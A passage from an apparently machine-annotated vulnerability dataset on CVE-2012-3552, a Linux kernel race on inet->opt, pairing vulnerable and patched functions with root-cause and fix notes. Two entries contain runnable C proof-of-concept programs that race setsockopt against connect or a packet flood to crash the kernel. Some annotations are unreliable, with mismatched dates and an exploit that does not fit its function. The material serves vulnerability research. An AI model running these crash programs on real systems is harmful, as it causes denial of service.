            "net/ipv4/tcp_ipv4.c": "int tcp_v4_connect(struct sock *sk, struct sockaddr *uaddr, int addr_len)\n{\n\tstruct sockaddr_in *usin = (struct sockaddr_in *)uaddr;\n\tstruct inet_sock *inet = inet_sk(sk);\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\t__be16 orig_sport, orig_dport;\n\t__be32 daddr, nexthop;\n \tstruct flowi4 fl4;\n \tstruct rtable *rt;\n \tint err;\n \n \tif (addr_len < sizeof(struct sockaddr_in))\n \t\treturn -EINVAL;\n\n\tif (usin->sin_family != AF_INET)\n \t\treturn -EAFNOSUPPORT;\n \n \tnexthop = daddr = usin->sin_addr.s_addr;\n\tif (inet->opt && inet->opt->srr) {\n \t\tif (!daddr)\n \t\t\treturn -EINVAL;\n\t\tnexthop = inet->opt->faddr;\n \t}\n \n \torig_sport = inet->inet_sport;\n\torig_dport = usin->sin_port;\n\trt = ip_route_connect(&fl4, nexthop, inet->inet_saddr,\n\t\t\t      RT_CONN_FLAGS(sk), sk->sk_bound_dev_if,\n\t\t\t      IPPROTO_TCP,\n\t\t\t      orig_sport, orig_dport, sk, true);\n\tif (IS_ERR(rt)) {\n\t\terr = PTR_ERR(rt);\n\t\tif (err == -ENETUNREACH)\n\t\t\tIP_INC_STATS_BH(sock_net(sk), IPSTATS_MIB_OUTNOROUTES);\n\t\treturn err;\n\t}\n\n\tif (rt->rt_flags & (RTCF_MULTICAST | RTCF_BROADCAST)) {\n\t\tip_rt_put(rt);\n \t\treturn -ENETUNREACH;\n \t}\n \n\tif (!inet->opt || !inet->opt->srr)\n \t\tdaddr = rt->rt_dst;\n \n \tif (!inet->inet_saddr)\n\t\tinet->inet_saddr = rt->rt_src;\n\tinet->inet_rcv_saddr = inet->inet_saddr;\n\n\tif (tp->rx_opt.ts_recent_stamp && inet->inet_daddr != daddr) {\n\t\t/* Reset inherited state */\n\t\ttp->rx_opt.ts_recent\t   = 0;\n\t\ttp->rx_opt.ts_recent_stamp = 0;\n\t\ttp->write_seq\t\t   = 0;\n\t}\n\n\tif (tcp_death_row.sysctl_tw_recycle &&\n\t    !tp->rx_opt.ts_recent_stamp && rt->rt_dst == daddr) {\n\t\tstruct inet_peer *peer = rt_get_peer(rt);\n\t\t/*\n\t\t * VJ's idea. We save last timestamp seen from\n\t\t * the destination in peer table, when entering state\n\t\t * TIME-WAIT * and initialize rx_opt.ts_recent from it,\n\t\t * when trying new connection.\n\t\t */\n\t\tif (peer) {\n\t\t\tinet_peer_refcheck(peer);\n\t\t\tif ((u32)get_seconds() - peer->tcp_ts_stamp <= TCP_PAWS_MSL) {\n\t\t\t\ttp->rx_opt.ts_recent_stamp = peer->tcp_ts_stamp;\n\t\t\t\ttp->rx_opt.ts_recent = peer->tcp_ts;\n\t\t\t}\n\t\t}\n\t}\n\n\tinet->inet_dport = usin->sin_port;\n \tinet->inet_daddr = daddr;\n \n \tinet_csk(sk)->icsk_ext_hdr_len = 0;\n\tif (inet->opt)\n\t\tinet_csk(sk)->icsk_ext_hdr_len = inet->opt->optlen;\n \n \ttp->rx_opt.mss_clamp = TCP_MSS_DEFAULT;\n \n\t/* Socket identity is still unknown (sport may be zero).\n\t * However we set state to SYN-SENT and not releasing socket\n\t * lock select source port, enter ourselves into the hash tables and\n\t * complete initialization after this.\n\t */\n\ttcp_set_state(sk, TCP_SYN_SENT);\n\terr = inet_hash_connect(&tcp_death_row, sk);\n\tif (err)\n\t\tgoto failure;\n\n\trt = ip_route_newports(&fl4, rt, orig_sport, orig_dport,\n\t\t\t       inet->inet_sport, inet->inet_dport, sk);\n\tif (IS_ERR(rt)) {\n\t\terr = PTR_ERR(rt);\n\t\trt = NULL;\n\t\tgoto failure;\n\t}\n\t/* OK, now commit destination to socket.  */\n\tsk->sk_gso_type = SKB_GSO_TCPV4;\n\tsk_setup_caps(sk, &rt->dst);\n\n\tif (!tp->write_seq)\n\t\ttp->write_seq = secure_tcp_sequence_number(inet->inet_saddr,\n\t\t\t\t\t\t\t   inet->inet_daddr,\n\t\t\t\t\t\t\t   inet->inet_sport,\n\t\t\t\t\t\t\t   usin->sin_port);\n\n\tinet->inet_id = tp->write_seq ^ jiffies;\n\n\terr = tcp_connect(sk);\n\trt = NULL;\n\tif (err)\n\t\tgoto failure;\n\n\treturn 0;\n\nfailure:\n\t/*\n\t * This unhashes the socket and releases the local port,\n\t * if necessary.\n\t */\n\ttcp_set_state(sk, TCP_CLOSE);\n\tip_rt_put(rt);\n\tsk->sk_route_caps = 0;\n\tinet->inet_dport = 0;\n\treturn err;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in TCP IPv4 connect with unsynchronized inet->opt access\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2012-10-03\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Resource Without Synchronization (\"Race Condition\")\n\n[Mandatory] Summary:\nThe tcp_v4_connect() function in net/ipv4/tcp_ipv4.c accesses the inet->opt pointer without RCU synchronization, allowing a race condition where another thread may free the structure while it is being accessed. During TCP connection establishment, the code reads inet->opt at multiple points (checking inet->opt && inet->opt->srr) without proper locking, creating a window where the object can be freed and reallocated, causing slab corruption and system crash.\n\n[Mandatory] Root cause:\nThe inet->opt pointer is directly dereferenced in multiple places without RCU or lock protection, allowing concurrent modification and free by another thread during socket option manipulation.\n\n[Mandatory] Attack Surface:\nTCP/IPv4 network stack, kernel socket layer\n\n[Mandatory] Impact Summary:\nDenial of service via slab corruption and system crash\n\n[Optional] Trigger / Attack vector:\nConcurrent socket option modification (setsockopt) combined with TCP connection establishment (connect syscall)\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nnexthop = daddr = usin->sin_addr.s_addr;\nif (inet->opt && inet->opt->srr) {\n    if (!daddr)\n        return -EINVAL;\n    nexthop = inet->opt->faddr;\n}\n...\nif (!inet->opt || !inet->opt->srr)\n    daddr = rt->rt_dst;\n\nif (inet->opt)\n    inet_csk(sk)->icsk_ext_hdr_len = inet->opt->optlen;\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nTCP socket option manipulation via setsockopt concurrent with tcp_v4_connect syscall\n\n[Mandatory] Exploit primitive(s) available:\nRace condition leading to use-after-free; slab corruption possible via freed object dereference\n\n[Mandatory] Exploitability summary:\nA local attacker can reliably trigger this by opening a TCP socket, starting a connection to a remote host while concurrently modifying socket options from another thread, forcing inet->opt to be freed and triggering slab corruption.\n\n[Mandatory] Exploit script (summary):\n- Thread 1: Call connect() on a TCP socket to trigger tcp_v4_connect()\n- Thread 2: Repeatedly call setsockopt(IP_OPTIONS, ...) to free and reallocate inet->opt\n- Race condition causes thread 1 to dereference freed inet->opt structure\n- Slab corruption/crash occurs due to invalid memory access in inet->opt->srr or inet->opt->optlen\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <unistd.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <string.h>\n\nint g_sock;\n\nvoid* race_options(void* arg) {\n    unsigned char opts[40];\n    for (int i = 0; i < 10000; i++) {\n        memset(opts, 0x41, sizeof(opts));\n        setsockopt(g_sock, IPPROTO_IP, IP_OPTIONS, opts, 40);\n        memset(opts, 0, sizeof(opts));\n        setsockopt(g_sock, IPPROTO_IP, IP_OPTIONS, opts, 0);\n    }\n    return NULL;\n}\n\nint main() {\n    g_sock = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr;\n    memset(&addr, 0, sizeof(addr));\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(80);\n    addr.sin_addr.s_addr = inet_addr(\"8.8.8.8\");\n    \n    pthread_t t;\n    pthread_create(&t, NULL, race_options, NULL);\n    \n    connect(g_sock, (struct sockaddr*)&addr, sizeof(addr));\n    \n    pthread_join(t, NULL);\n    close(g_sock);\n    return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\nstruct ip_options_rcu *inet_opt;\n\nnexthop = daddr = usin->sin_addr.s_addr;\ninet_opt = rcu_dereference_protected(inet->inet_opt,\n                                     sock_owned_by_user(sk));\nif (inet_opt && inet_opt->opt.srr) {\n    if (!daddr)\n        return -EINVAL;\n    nexthop = inet_opt->opt.faddr;\n}\n...\nif (!inet_opt || !inet_opt->opt.srr)\n    daddr = rt->rt_dst;\n\nif (inet_opt)\n    inet_csk(sk)->icsk_ext_hdr_len = inet_opt->opt.optlen;\n```\n\n[Mandatory] Fix summary:\nThe patch wraps all inet->opt accesses with rcu_dereference_protected() and introduces a new ip_options_rcu wrapper structure containing an RCU head. This ensures synchronized access: the socket is locked during tcp_v4_connect (verified by sock_owned_by_user()), preventing concurrent free of the structure.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\n[Optional] Patch Analysis:\nThe commit \"inet: add RCU protection to inet->opt\" added RCU synchronization to protect inet->opt (renamed inet->inet_opt) by wrapping it in a new ip_options_rcu structure and using rcu_dereference_protected() with sock_owned_by_user() assertion to ensure the socket lock is held during access.\n\nPatchType: RCU synchronization and locking assertion added to shared pointer access\n\n[Optional] Variant & Triage Guidance:\n- Review other network protocol handlers (IPv6, UDP, etc.) for similar unsynchronized inet->opt accesses\n- Search for other ip_options or socket option pointers accessed without synchronization\n- Check if other shared kernel data structures modified concurrently via setsockopt lack similar RCU/lock protection\n\n[Optional] Likely variants/impact:\nSimilar race conditions in other socket option handlers and network stack code paths that permit concurrent modification of shared kernel structures without proper synchronization.",
        "tests": "NA",
        "solutions": "int tcp_v4_connect(struct sock *sk, struct sockaddr *uaddr, int addr_len)\n{\n\tstruct sockaddr_in *usin = (struct sockaddr_in *)uaddr;\n\tstruct inet_sock *inet = inet_sk(sk);\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\t__be16 orig_sport, orig_dport;\n\t__be32 daddr, nexthop;\n \tstruct flowi4 fl4;\n \tstruct rtable *rt;\n \tint err;\n\tstruct ip_options_rcu *inet_opt;\n \n \tif (addr_len < sizeof(struct sockaddr_in))\n \t\treturn -EINVAL;\n\n\tif (usin->sin_family != AF_INET)\n \t\treturn -EAFNOSUPPORT;\n \n \tnexthop = daddr = usin->sin_addr.s_addr;\n\tinet_opt = rcu_dereference_protected(inet->inet_opt,\n\t\t\t\t\t     sock_owned_by_user(sk));\n\tif (inet_opt && inet_opt->opt.srr) {\n \t\tif (!daddr)\n \t\t\treturn -EINVAL;\n\t\tnexthop = inet_opt->opt.faddr;\n \t}\n \n \torig_sport = inet->inet_sport;\n\torig_dport = usin->sin_port;\n\trt = ip_route_connect(&fl4, nexthop, inet->inet_saddr,\n\t\t\t      RT_CONN_FLAGS(sk), sk->sk_bound_dev_if,\n\t\t\t      IPPROTO_TCP,\n\t\t\t      orig_sport, orig_dport, sk, true);\n\tif (IS_ERR(rt)) {\n\t\terr = PTR_ERR(rt);\n\t\tif (err == -ENETUNREACH)\n\t\t\tIP_INC_STATS_BH(sock_net(sk), IPSTATS_MIB_OUTNOROUTES);\n\t\treturn err;\n\t}\n\n\tif (rt->rt_flags & (RTCF_MULTICAST | RTCF_BROADCAST)) {\n\t\tip_rt_put(rt);\n \t\treturn -ENETUNREACH;\n \t}\n \n\tif (!inet_opt || !inet_opt->opt.srr)\n \t\tdaddr = rt->rt_dst;\n \n \tif (!inet->inet_saddr)\n\t\tinet->inet_saddr = rt->rt_src;\n\tinet->inet_rcv_saddr = inet->inet_saddr;\n\n\tif (tp->rx_opt.ts_recent_stamp && inet->inet_daddr != daddr) {\n\t\t/* Reset inherited state */\n\t\ttp->rx_opt.ts_recent\t   = 0;\n\t\ttp->rx_opt.ts_recent_stamp = 0;\n\t\ttp->write_seq\t\t   = 0;\n\t}\n\n\tif (tcp_death_row.sysctl_tw_recycle &&\n\t    !tp->rx_opt.ts_recent_stamp && rt->rt_dst == daddr) {\n\t\tstruct inet_peer *peer = rt_get_peer(rt);\n\t\t/*\n\t\t * VJ's idea. We save last timestamp seen from\n\t\t * the destination in peer table, when entering state\n\t\t * TIME-WAIT * and initialize rx_opt.ts_recent from it,\n\t\t * when trying new connection.\n\t\t */\n\t\tif (peer) {\n\t\t\tinet_peer_refcheck(peer);\n\t\t\tif ((u32)get_seconds() - peer->tcp_ts_stamp <= TCP_PAWS_MSL) {\n\t\t\t\ttp->rx_opt.ts_recent_stamp = peer->tcp_ts_stamp;\n\t\t\t\ttp->rx_opt.ts_recent = peer->tcp_ts;\n\t\t\t}\n\t\t}\n\t}\n\n\tinet->inet_dport = usin->sin_port;\n \tinet->inet_daddr = daddr;\n \n \tinet_csk(sk)->icsk_ext_hdr_len = 0;\n\tif (inet_opt)\n\t\tinet_csk(sk)->icsk_ext_hdr_len = inet_opt->opt.optlen;\n \n \ttp->rx_opt.mss_clamp = TCP_MSS_DEFAULT;\n \n\t/* Socket identity is still unknown (sport may be zero).\n\t * However we set state to SYN-SENT and not releasing socket\n\t * lock select source port, enter ourselves into the hash tables and\n\t * complete initialization after this.\n\t */\n\ttcp_set_state(sk, TCP_SYN_SENT);\n\terr = inet_hash_connect(&tcp_death_row, sk);\n\tif (err)\n\t\tgoto failure;\n\n\trt = ip_route_newports(&fl4, rt, orig_sport, orig_dport,\n\t\t\t       inet->inet_sport, inet->inet_dport, sk);\n\tif (IS_ERR(rt)) {\n\t\terr = PTR_ERR(rt);\n\t\trt = NULL;\n\t\tgoto failure;\n\t}\n\t/* OK, now commit destination to socket.  */\n\tsk->sk_gso_type = SKB_GSO_TCPV4;\n\tsk_setup_caps(sk, &rt->dst);\n\n\tif (!tp->write_seq)\n\t\ttp->write_seq = secure_tcp_sequence_number(inet->inet_saddr,\n\t\t\t\t\t\t\t   inet->inet_daddr,\n\t\t\t\t\t\t\t   inet->inet_sport,\n\t\t\t\t\t\t\t   usin->sin_port);\n\n\tinet->inet_id = tp->write_seq ^ jiffies;\n\n\terr = tcp_connect(sk);\n\trt = NULL;\n\tif (err)\n\t\tgoto failure;\n\n\treturn 0;\n\nfailure:\n\t/*\n\t * This unhashes the socket and releases the local port,\n\t * if necessary.\n\t */\n\ttcp_set_state(sk, TCP_CLOSE);\n\tip_rt_put(rt);\n\tsk->sk_route_caps = 0;\n\tinet->inet_dport = 0;\n\treturn err;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/tcp_ipv4.c": "static struct ip_options *tcp_v4_save_options(struct sock *sk,\n\t\t\t\t\t      struct sk_buff *skb)\n {\n\tstruct ip_options *opt = &(IPCB(skb)->opt);\n\tstruct ip_options *dopt = NULL;\n \n \tif (opt && opt->optlen) {\n\t\tint opt_size = optlength(opt);\n \t\tdopt = kmalloc(opt_size, GFP_ATOMIC);\n \t\tif (dopt) {\n\t\t\tif (ip_options_echo(dopt, skb)) {\n \t\t\t\tkfree(dopt);\n \t\t\t\tdopt = NULL;\n \t\t\t}\n\t\t}\n\t}\n\treturn dopt;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362:\nRace condition in TCP IPv4 socket options handling\n\nDisclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\nAffected products/versions:\nLinux kernel before version 3.0\n\nThe Vulnerability\n\nCWE/CVE Number and description:\nCWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)\n\nSummary:\nThe tcp_v4_save_options() function in net/ipv4/tcp_ipv4.c accesses the inet->opt pointer without RCU protection or proper synchronization. A race condition occurs when one thread modifies the socket's IP options and frees the old ip_options structure while another thread (executing tcp_v4_save_options during packet processing) is concurrently reading or copying those same options. This causes the function to access freed memory, leading to slab corruption and kernel panic when the freed memory is reallocated and overwritten.\n\nRoot cause:\nThe function dereferences inet->opt without RCU synchronization, allowing concurrent modification and freeing of the ip_options structure by socket option setter threads.\n\nAttack Surface:\nNetwork stack IP/TCP layer, socket option handling\n\nImpact Summary:\nUse-after-free \u2192 slab memory corruption \u2192 kernel panic / denial of service\n\nTrigger / Attack vector:\nRemote attacker sends crafted IP packets with options to a target application while the application concurrently modifies socket IP options via setsockopt()\n\nKey code/struct excerpt (minimal):\n```\nstatic struct ip_options *tcp_v4_save_options(struct sock *sk,\n                                              struct sk_buff *skb)\n{\n    struct ip_options *opt = &(IPCB(skb)->opt);\n    struct ip_options *dopt = NULL;\n    \n    if (opt && opt->optlen) {\n        int opt_size = optlength(opt);\n        dopt = kmalloc(opt_size, GFP_ATOMIC);\n        if (dopt) {\n            if (ip_options_echo(dopt, skb)) {\n                kfree(dopt);\n                dopt = NULL;\n            }\n        }\n    }\n    return dopt;\n}\n```\n\nExploit:\n\nTrigger surface/attack vector:\nIP packets with socket options sent to a listening service while socket options are modified concurrently via setsockopt()\n\nExploit primitive(s) available:\nUse-after-free read, slab corruption, arbitrary write to freed kernel memory\n\nExploitability summary:\nThe race window is narrow but reproducible through high-intensity concurrent packet reception and socket option modification; successful exploitation leads to deterministic kernel panic.\n\nExploit script (summary, 3\u20136 bullets):\n- Open a UDP/TCP socket and bind to a listening port\n- In one thread, rapidly send crafted IP packets with IP options (e.g., record-route or timestamp options) to the local listener\n- In a second thread, continuously modify the socket's IP options using setsockopt(IP_OPTIONS, ...)\n- The race condition causes tcp_v4_save_options() to read an inet->opt pointer that has been freed by the setsockopt path\n- The freed memory is accessed during ip_options_echo(), corrupting the allocator's metadata or adjacent objects\n- Kernel detects corruption and crashes (BUG_ON or page fault)\n\nExploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <pthread.h>\n\nvoid *flood_packets(void *arg) {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    struct sockaddr_in addr;\n    char buf[256];\n    \n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(5000);\n    addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    \n    while (1) {\n        sendto(sock, buf, sizeof(buf), 0, \n               (struct sockaddr*)&addr, sizeof(addr));\n    }\n    return NULL;\n}\n\nvoid *modify_opts(void *arg) {\n    int sock = (int)(intptr_t)arg;\n    unsigned char opt[] = {68, 4, 9, 0};\n    \n    while (1) {\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opt, sizeof(opt));\n        usleep(1);\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, NULL, 0);\n    }\n    return NULL;\n}\n\nint main() {\n    int listen_sock = socket(AF_INET, SOCK_DGRAM, 0);\n    struct sockaddr_in addr;\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(5000);\n    addr.sin_addr.s_addr = INADDR_ANY;\n    bind(listen_sock, (struct sockaddr*)&addr, sizeof(addr));\n    \n    pthread_t t1, t2;\n    pthread_create(&t1, NULL, flood_packets, NULL);\n    pthread_create(&t2, NULL, modify_opts, (void*)(intptr_t)listen_sock);\n    sleep(10);\n    return 0;\n}\n```\n\nFix\n\nFix code:\n```\nstatic struct ip_options_rcu *tcp_v4_save_options(struct sock *sk,\n                                                   struct sk_buff *skb)\n{\n    const struct ip_options *opt = &(IPCB(skb)->opt);\n    struct ip_options_rcu *dopt = NULL;\n    \n    if (opt && opt->optlen) {\n        int opt_size = sizeof(*dopt) + opt->optlen;\n        dopt = kmalloc(opt_size, GFP_ATOMIC);\n        if (dopt) {\n            if (ip_options_echo(&dopt->opt, skb)) {\n                kfree(dopt);\n                dopt = NULL;\n            }\n        }\n    }\n    return dopt;\n}\n```\n\nFix summary:\nThe patch introduces RCU protection by wrapping ip_options in a new ip_options_rcu structure and updating all access paths to use RCU read-side critical sections. The return type changes from ip_options to ip_options_rcu, and the size calculation includes the wrapper structure. This prevents concurrent use-after-free by ensuring the options remain accessible during the critical section.\n\nPatch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\nPatch Analysis:\nThe patch adds RCU synchronization to inet->opt access, preventing the described race condition by ensuring that readers see a consistent view of the options structure. The introduction of ip_options_rcu allows proper refcounting and safe deferred freeing.\n\nPatchType: Synchronization primitive added (RCU protection, structure wrapping)\n\nVariant & Triage Guidance\n\nVariant analysis suggestions (2\u20133 bullets):\n- Review ip_setup_cork() and ip_make_skb() for similar unprotected inet->opt dereferences\n- Check other callers of ip_options_echo() for missing RCU synchronization\n- Audit all socket option setters (setsockopt handlers) that modify inet->opt to ensure proper RCU grace periods\n\nLikely variants/impact (one line):\nSimilar race conditions in IP multicast options, socket_in_compat_ioctl, and other protocol handlers accessing shared socket state without synchronization.",
        "tests": "NA",
        "solutions": "static struct ip_options *tcp_v4_save_options(struct sock *sk,\nstatic struct ip_options_rcu *tcp_v4_save_options(struct sock *sk,\n\t\t\t\t\t\t  struct sk_buff *skb)\n {\n\tconst struct ip_options *opt = &(IPCB(skb)->opt);\n\tstruct ip_options_rcu *dopt = NULL;\n \n \tif (opt && opt->optlen) {\n\t\tint opt_size = sizeof(*dopt) + opt->optlen;\n\n \t\tdopt = kmalloc(opt_size, GFP_ATOMIC);\n \t\tif (dopt) {\n\t\t\tif (ip_options_echo(&dopt->opt, skb)) {\n \t\t\t\tkfree(dopt);\n \t\t\t\tdopt = NULL;\n \t\t\t}\n\t\t}\n\t}\n\treturn dopt;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/tcp_ipv4.c": "struct sock *tcp_v4_syn_recv_sock(struct sock *sk, struct sk_buff *skb,\n\t\t\t\t  struct request_sock *req,\n\t\t\t\t  struct dst_entry *dst)\n{\n\tstruct inet_request_sock *ireq;\n\tstruct inet_sock *newinet;\n\tstruct tcp_sock *newtp;\n\tstruct sock *newsk;\n #ifdef CONFIG_TCP_MD5SIG\n \tstruct tcp_md5sig_key *key;\n #endif\n \n \tif (sk_acceptq_is_full(sk))\n \t\tgoto exit_overflow;\n\n\tif (!dst && (dst = inet_csk_route_req(sk, req)) == NULL)\n\t\tgoto exit;\n\n\tnewsk = tcp_create_openreq_child(sk, req, skb);\n\tif (!newsk)\n\t\tgoto exit_nonewsk;\n\n\tnewsk->sk_gso_type = SKB_GSO_TCPV4;\n\tsk_setup_caps(newsk, dst);\n\n\tnewtp\t\t      = tcp_sk(newsk);\n\tnewinet\t\t      = inet_sk(newsk);\n\tireq\t\t      = inet_rsk(req);\n \tnewinet->inet_daddr   = ireq->rmt_addr;\n \tnewinet->inet_rcv_saddr = ireq->loc_addr;\n \tnewinet->inet_saddr\t      = ireq->loc_addr;\n\tnewinet->opt\t      = ireq->opt;\n \tireq->opt\t      = NULL;\n \tnewinet->mc_index     = inet_iif(skb);\n \tnewinet->mc_ttl\t      = ip_hdr(skb)->ttl;\n \tinet_csk(newsk)->icsk_ext_hdr_len = 0;\n\tif (newinet->opt)\n\t\tinet_csk(newsk)->icsk_ext_hdr_len = newinet->opt->optlen;\n \tnewinet->inet_id = newtp->write_seq ^ jiffies;\n \n \ttcp_mtup_init(newsk);\n\ttcp_sync_mss(newsk, dst_mtu(dst));\n\tnewtp->advmss = dst_metric_advmss(dst);\n\tif (tcp_sk(sk)->rx_opt.user_mss &&\n\t    tcp_sk(sk)->rx_opt.user_mss < newtp->advmss)\n\t\tnewtp->advmss = tcp_sk(sk)->rx_opt.user_mss;\n\n\ttcp_initialize_rcv_mss(newsk);\n\n#ifdef CONFIG_TCP_MD5SIG\n\t/* Copy over the MD5 key from the original socket */\n\tkey = tcp_v4_md5_do_lookup(sk, newinet->inet_daddr);\n\tif (key != NULL) {\n\t\t/*\n\t\t * We're using one, so create a matching key\n\t\t * on the newsk structure. If we fail to get\n\t\t * memory, then we end up not copying the key\n\t\t * across. Shucks.\n\t\t */\n\t\tchar *newkey = kmemdup(key->key, key->keylen, GFP_ATOMIC);\n\t\tif (newkey != NULL)\n\t\t\ttcp_v4_md5_do_add(newsk, newinet->inet_daddr,\n\t\t\t\t\t  newkey, key->keylen);\n\t\tsk_nocaps_add(newsk, NETIF_F_GSO_MASK);\n\t}\n#endif\n\n\tif (__inet_inherit_port(sk, newsk) < 0) {\n\t\tsock_put(newsk);\n\t\tgoto exit;\n\t}\n\t__inet_hash_nolisten(newsk, NULL);\n\n\treturn newsk;\n\nexit_overflow:\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_LISTENOVERFLOWS);\nexit_nonewsk:\n\tdst_release(dst);\nexit:\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_LISTENDROPS);\n\treturn NULL;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362:\nRace condition in TCP socket option handling during connection establishment\n\nDisclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: Not available in input\n\nAffected products/versions:\nLinux kernel < 3.0\n\nThe Vulnerability\n\nCWE/CVE Number and description:\nCWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)\n\nSummary:\nThe tcp_v4_syn_recv_sock() function in net/ipv4/tcp_ipv4.c directly assigns ireq->opt to newinet->opt without RCU synchronization. A remote attacker can trigger a race condition by sending TCP packets while the kernel simultaneously processes socket option modifications (e.g., via setsockopt), causing concurrent, unsynchronized access to the same inet->opt pointer. This leads to slab memory corruption when the option structure is freed under one thread while another still references it.\n\nRoot cause:\nUnprotected assignment of shared socket option pointer (inet->opt) in concurrent context without Read-Copy-Update (RCU) or other synchronization primitive.\n\nAttack Surface:\nLinux kernel TCP/IPv4 network stack, socket option handling during incoming connection establishment.\n\nImpact Summary:\nDenial of service (kernel slab corruption and system crash)\n\nTrigger / Attack vector:\nRemote attacker sends TCP packets to a listening socket while concurrently triggering socket option changes on the same socket through setsockopt().\n\nKey code/struct excerpt (minimal):\n```c\nnewinet->opt = ireq->opt;\nireq->opt = NULL;\n...\nif (newinet->opt)\n    inet_csk(newsk)->icsk_ext_hdr_len = newinet->opt->optlen;\n```\n\nExploit:\n\nTrigger surface/attack vector:\nTCP SYN packets sent to listening socket combined with concurrent setsockopt() calls.\n\nExploit primitive(s) available:\nHeap memory corruption via unsynchronized pointer dereference and use-after-free.\n\nExploitability summary:\nExploitation requires precise timing between TCP connection handling and socket option modification, rendering it non-trivial but achievable through multi-threaded attack delivering rapid SYN packets while continuously modifying socket options.\n\nExploit script (summary, 3\u20136 bullets):\n- Create a listening TCP socket with TCP_MD5SIG or 